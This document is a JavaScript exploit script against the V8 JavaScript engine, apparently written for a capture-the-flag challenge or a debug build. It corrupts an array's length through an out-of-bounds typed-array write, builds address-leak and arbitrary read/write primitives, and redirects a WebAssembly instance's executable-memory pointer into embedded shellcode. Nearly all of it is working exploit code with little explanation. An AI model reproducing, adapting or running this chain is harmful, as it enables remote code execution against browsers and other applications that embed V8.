// shared 8-byte buffer
const buf = new ArrayBuffer(8);
// views: one float (Number), one 64-bit unsigned integer (BigInt)
const float_view = new Float64Array(buf);
const int_view   = new BigUint64Array(buf);

const UPPER_MASK = 0xffffffff00000000n;
const LOWER_MASK = 0x00000000ffffffffn;

// helpers (same as yours, with a couple small tweaks)
BigInt.prototype.hex = function () {
  return '0x' + this.toString(16);
};
BigInt.prototype.i2f = function () {
  int_view[0] = this;
  return float_view[0];
};
BigInt.prototype.smi2f = function () {
  int_view[0] = this << 32n;
  return float_view[0];
};
BigInt.prototype.num = function () {
  return Number(this)
}

Number.prototype.f2i = function () {
  float_view[0] = this;
  return int_view[0];
};

// float to small integer
Number.prototype.f2smi = function () {
  float_view[0] = this;
  return int_view[0] >> 32n;
};
Number.prototype.flw = function () { // low 32 bits
  float_view[0] = this;
  return int_view[0] & ((1n << 32n) - 1n); // avoid Number→BigInt cast
};

Number.prototype.i2f = function () {
  return BigInt(this).i2f();
};
Number.prototype.smi2f = function () {
  return BigInt(this).smi2f();
};

// functions will be available for floats, integers but **not** BigInteger
// higher doubleword
Number.prototype.f_hdw = function() {
    float_view[0] = this;
    return int_view[0] >> 32n;
}

// lower doubleword
Number.prototype.f_ldw = function() {
    float_view[0] = this;
    return int_view[0] & BigInt(2**32-1);
}

function hex(a) {
    return "0x" + a.toString(16);
}

function toLittle(buf) {
	return new DataView(buf).getBigUint64(0, false);
}

function log_hex(v) {
  console.log(hex(v))
}

var src = [1.3];
var victim = [0.1, 0.2];
var dst = [0.5, 0.6];
var obj = {'A': 1};
var obj_arr = [obj, obj];
var arb_rw_arr = [1.1, 1.2, 2.3];

var victim_elem_ptr = 0;

// Write obj to obj_arr, get its address by oob access from victim array
function addr_of(obj) {
  obj_arr[0] = obj;
  let addr = victim[0x10];
  return addr.f_ldw();
}

// Get arbitrary write / read primitive by overwriting elements pointer of
// JSArray (FixedDoubleArray)
function arb_read(addr) {
  addr -= 8n;
  let off = addr_of(arb_rw_arr) - victim_elem_ptr;
  off = (off/8n);
  let orig_val = victim[off].f2i();
  let new_val = (BigInt(orig_val) & UPPER_MASK) | addr;

  //console.log(`addr of element ptr: ${hex(addr+off*8n-1n)}, off: ${off}, new_val: ${hex(new_val)}`)

  victim[off.num()] = new_val.i2f();

  return arb_rw_arr[0];
}

function arb_write(addr, val) {
  addr -= 8n;
  let off = addr_of(arb_rw_arr) - victim_elem_ptr;
  off = (off/8n);
  let orig_val = victim[off].f2i();
  let new_val = (BigInt(orig_val) & UPPER_MASK) | addr;

  //console.log(`addr of element ptr: ${hex(addr+off*8n-1n)}, off: ${off}, new_val: ${hex(new_val)}`)

  victim[off.num()] = new_val.i2f();

  arb_rw_arr[0] = val.i2f();
}

function wait() {
  while (true) {}
}

function recover_elements_ptr() {
  //var src = [(0x1000n<<32n<<1n | 0xc0001n ).i2f()];
  for (let j = 0; j < 0x2; j++) {
    if (j == 0) {
      src[0] = (0x1000n<<32n<<1n | 0xc0001n ).i2f();
      dst.set(src, -2);
    }
    else {
      src[0] = (0x1000n<<32n<<1n | 0xc0005n ).i2f();
      dst.set(src, -2);
    }
    for(let i = 2; i < 0x1000; i++) {
      if (victim[i] == 0.1 && victim[i+1] == 0.2) {
        let off = 0;
        if (j == 1) {
          off = ((i*8) | 1) + 0xc0004;
          alignment = 4;
        }
        else {
          off = ((i*8) | 1) + 0xc0000;
        }
        info("Found elements, recovering pointer, ", hex(off), j)
        victim_elem_ptr = BigInt(off);
        let val = (0x10000n<<32n) | BigInt(off);
        src[0] = val.i2f()
        dst.set(src, -2);
        return true;
      }
    }
  }

  src[0] = (0x1000n<<32n<<1n | 0xc0001n ).i2f();

  return false;

}

function sleepSync(ms) {
  const end = Date.now() + ms;
  while (Date.now() < end) {}
}

function info(msg) {
  console.log(`[+] ${msg}`)
}

function err(msg) {
  console.log(`[-] ${msg}`)
}


// todo: write python tool to compile assembly, build the wasm code, compile it, print the uint8array

// why is the trigger required ?
// there is some mechanism which allows the code to jump _instantly_ to the location
// of the Jit compiled code when calling it for the second time => corrupting the
// rwx pointer in trusted_data has no effect anymore

function pwn() {
  //%DebugPrint(dst);
  //%DebugPrint(victim);
  %DebugPrint(arb_rw_arr);
  //%DebugPrint(obj_arr);
  //dst.set(src, -1);

  // corrupt size of victim, also corrupts the element_pointer so we need to recover it
  // search for elements of victim array to find offset
  // only works when setting i very high. idk why

  if (!recover_elements_ptr()) {
    err("Unable to recover elements pointer");
    return;
  }

  let addr = addr_of(arb_rw_arr);
  info(`Addr of arb_rw_arr: ${hex(addr)}`);

  let val = arb_read(addr);
  info(`Val at victim addr: ${hex(val.f2i())}`)

  var wasm_code = new Uint8Array([
    0,97,115,109,1,0,0,0,1,4,1,96,0,0,3,3,2,0,0,5,3,1,0,1,7,19,2,7,116,114,105,103,103,101,114,0,0,5,115,104,101,108,108,0,1,10,99,2,3,0,1,11,93,0,65,0,66,212,188,197,249,143,146,228,245,9,55,3,0,65,8,66,186,129,130,128,128,128,228,245,6,55,3,0,65,16,66,177,128,191,168,128,146,228,245,6,55,3,0,65,24,66,184,247,128,128,128,128,228,245,6,55,3,0,65,32,66,212,190,197,177,159,198,244,245,6,55,3,0,65,40,66,143,138,172,247,143,146,164,200,144,127,55,3,0,11,0,12,4,110,97,109,101,2,5,2,0,0,1,0
  ]);

  var wasm_mod = new WebAssembly.Module(wasm_code);
  var wasm_instance = new WebAssembly.Instance(wasm_mod);
  var shell = wasm_instance.exports.shell;
  var trigger = wasm_instance.exports.trigger;

  %DebugPrint(shell)
  shell();
  //%DebugPrint(wasm_instance);

  let trusted_data_addr = arb_read(addr_of(wasm_instance) + 0x8n).f_hdw();
  info(`Trusted data: ${hex(trusted_data_addr)}`)

  let rwx_ptr = arb_read(trusted_data_addr + 5n*8n).f2i();
  info(`Rwx page: ${hex(rwx_ptr)}`)

  arb_write(trusted_data_addr+ 5n*8n, rwx_ptr+0x91en);
  info(`Sc start: ${hex(rwx_ptr+0x91en)}`)

  console.log("TRIGGER")
  trigger();

  /*
  for (let i = 0; i < 0x40; i++) {
    let test = victim[i];
    console.log(`idx: ${hex(i)} val: ${hex(test.f2i())}`)
    //log_hex(test.f2i())
  }
  */

  wait()

}

pwn();
